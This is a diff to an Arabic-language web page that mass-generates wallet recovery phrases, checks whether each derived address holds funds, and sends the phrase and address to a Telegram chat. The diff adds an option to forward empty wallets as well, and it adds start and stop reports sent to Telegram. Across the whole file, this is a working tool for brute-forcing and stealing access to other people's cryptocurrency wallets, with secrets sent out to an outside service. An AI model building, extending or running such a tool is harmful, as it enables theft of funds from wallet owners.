@@ -1,4 +1,4 @@
-بحبك 
+من
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -91,6 +91,24 @@
             outline: none;
             border-color: #4facfe;
             box-shadow: 0 0 0 3px rgba(79, 172, 254, 0.1);
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 15px 0;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+        }
+
+        .checkbox-group label {
+            margin: 0;
+            font-weight: 500;
+            color: #495057;
         }
 
         .button-group {
@@ -269,6 +287,10 @@
 
         .log-info {
             color: #17a2b8;
+        }
+
+        .log-warning {
+            color: #ffc107;
         }
 
         .wallet-display {
@@ -518,6 +540,11 @@
                 <div class="control-group">
                     <label for="maxAttempts">الحد الأقصى للمحاولات (0 = لا نهاية):</label>
                     <input type="number" id="maxAttempts" value="0" min="0" max="10000">
+                </div>
+
+                <div class="checkbox-group">
+                    <input type="checkbox" id="sendEmptyWallets" checked>
+                    <label for="sendEmptyWallets">إرسال المحافظ الفارغة إلى Telegram</label>
                 </div>
 
                 <div class="button-group">
@@ -831,6 +858,7 @@
             manualTestResult: document.getElementById('manualTestResult'),
             searchSpeed: document.getElementById('searchSpeed'),
             maxAttempts: document.getElementById('maxAttempts'),
+            sendEmptyWallets: document.getElementById('sendEmptyWallets'),
             totalGenerated: document.getElementById('totalGenerated'),
             activeWallets: document.getElementById('activeWallets'),
             emptyWallets: document.getElementById('emptyWallets'),
@@ -986,7 +1014,7 @@
             }
         }
 
-        function formatWalletMessage(mnemonic, address, walletDetails) {
+        function formatWalletMessage(mnemonic, address, walletDetails, isActive = true) {
             const timestamp = new Date().toLocaleString('ar-EG', {
                 timeZone: 'Africa/Cairo',
                 year: 'numeric',
@@ -997,7 +1025,14 @@
                 second: '2-digit'
             });
             
-            let message = `🔑 <b>عبارة استرجاع جديدة</b>\n\n`;
+            let message = '';
+            
+            if (isActive) {
+                message = `🎉 <b>تم العثور على محفظة نشطة!</b>\n\n`;
+            } else {
+                message = `📭 <b>محفظة فارغة</b>\n\n`;
+            }
+            
             message += `📝 <b>العبارة:</b>\n<code>${mnemonic}</code>\n\n`;
             message += `📍 <b>العنوان:</b>\n<code>${address}</code>\n\n`;
             
@@ -1013,12 +1048,12 @@
             return message;
         }
 
-        async function sendActiveWalletToTelegram(mnemonic, address, walletDetails) {
+        async function sendWalletToTelegram(mnemonic, address, walletDetails, isActive = true) {
             try {
-                const message = formatWalletMessage(mnemonic, address, walletDetails);
+                const message = formatWalletMessage(mnemonic, address, walletDetails, isActive);
                 return await sendTelegramMessage(message);
             } catch (error) {
-                console.error('خطأ في إرسال المحفظة النشطة:', error);
+                console.error('خطأ في إرسال المحفظة:', error);
                 return false;
             }
         }
@@ -1086,17 +1121,29 @@
                     stats.activeWallets++;
                     addLogEntry(`🎉 تم العثور على محفظة نشطة! العنوان: ${address}`, 'success');
                     
-                    const telegramSent = await sendActiveWalletToTelegram(mnemonic, address, walletStatus);
+                    // إرسال المحفظة النشطة إلى Telegram
+                    const telegramSent = await sendWalletToTelegram(mnemonic, address, walletStatus, true);
                     if (telegramSent) {
-                        addLogEntry('✅ تم إرسال المحفظة إلى Telegram بنجاح', 'success');
+                        addLogEntry('✅ تم إرسال المحفظة النشطة إلى Telegram بنجاح', 'success');
                     } else {
-                        addLogEntry('❌ فشل في إرسال المحفظة إلى Telegram', 'error');
+                        addLogEntry('❌ فشل في إرسال المحفظة النشطة إلى Telegram', 'error');
                     }
                     
                     updateStatus(`تم العثور على محفظة نشطة! إجمالي المحافظ النشطة: ${stats.activeWallets}`, 'success');
                 } else {
                     stats.emptyWallets++;
-                    addLogEntry(`محفظة فارغة: ${address.substring(0, 20)}...`);
+                    addLogEntry(`محفظة فارغة: ${address.substring(0, 20)}...`, 'info');
+                    
+                    // التحقق مما إذا كان يجب إرسال المحافظ الفارغة
+                    const sendEmpty = elements.sendEmptyWallets.checked;
+                    if (sendEmpty) {
+                        const telegramSent = await sendWalletToTelegram(mnemonic, address, walletStatus, false);
+                        if (telegramSent) {
+                            addLogEntry('📭 تم إرسال المحفظة الفارغة إلى Telegram', 'info');
+                        } else {
+                            addLogEntry('❌ فشل في إرسال المحفظة الفارغة إلى Telegram', 'error');
+                        }
+                    }
                 }
                 
                 updateStats();
@@ -1152,7 +1199,7 @@
                     updateStatus('🎉 العبارة تفتح محفظة نشطة!', 'success');
                     
                     // إرسال المحفظة النشطة إلى Telegram
-                    const telegramSent = await sendActiveWalletToTelegram(mnemonic, address, walletStatus);
+                    const telegramSent = await sendWalletToTelegram(mnemonic, address, walletStatus, true);
                     if (telegramSent) {
                         addLogEntry('✅ تم إرسال المحفظة إلى Telegram بنجاح', 'success');
                     } else {
@@ -1161,6 +1208,17 @@
                 } else {
                     addLogEntry(`❌ العبارة تفتح محفظة فارغة: ${address}`, 'info');
                     updateStatus('❌ العبارة تفتح محفظة فارغة', 'info');
+                    
+                    // إرسال المحفظة الفارغة إلى Telegram إذا كان الخيار مفعل
+                    const sendEmpty = elements.sendEmptyWallets.checked;
+                    if (sendEmpty) {
+                        const telegramSent = await sendWalletToTelegram(mnemonic, address, walletStatus, false);
+                        if (telegramSent) {
+                            addLogEntry('📭 تم إرسال المحفظة الفارغة إلى Telegram', 'info');
+                        } else {
+                            addLogEntry('❌ فشل في إرسال المحفظة الفارغة إلى Telegram', 'error');
+                        }
+                    }
                 }
                 
                 // إعادة تعيين الزر
@@ -1234,7 +1292,12 @@
             addLogEntry('🚀 تم بدء البحث عن المحافظ النشطة');
             
             // إرسال رسالة البداية إلى Telegram
-            const startMessage = `🚀 <b>بدء عملية البحث عن المحافظ النشطة</b>\n\n⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}\n🔍 جاري البحث عن محافظ تحتوي على رصيد أو معاملات...`;
+            const sendEmpty = elements.sendEmptyWallets.checked;
+            let startMessage = `🚀 <b>بدء عملية البحث عن المحافظ</b>\n\n`;
+            startMessage += `⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}\n`;
+            startMessage += `🔍 جاري البحث عن محافظ...\n`;
+            startMessage += `📭 إرسال المحافظ الفارغة: ${sendEmpty ? '✅ مفعل' : '❌ معطل'}`;
+            
             await sendTelegramMessage(startMessage);
             
             searchInterval = setInterval(searchForActiveWallets, speed);
@@ -1260,7 +1323,7 @@
             stopMessage += `📊 <b>الإحصائيات النهائية:</b>\n`;
             stopMessage += `🔢 إجمالي العبارات: ${stats.totalGenerated}\n`;
             stopMessage += `✅ المحافظ النشطة: ${stats.activeWallets}\n`;
-            stopMessage += `❌ المحافظ الفارغة: ${stats.emptyWallets}\n`;
+            stopMessage += `📭 المحافظ الفارغة: ${stats.emptyWallets}\n`;
             stopMessage += `\n⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`;
             
             await sendTelegramMessage(stopMessage);
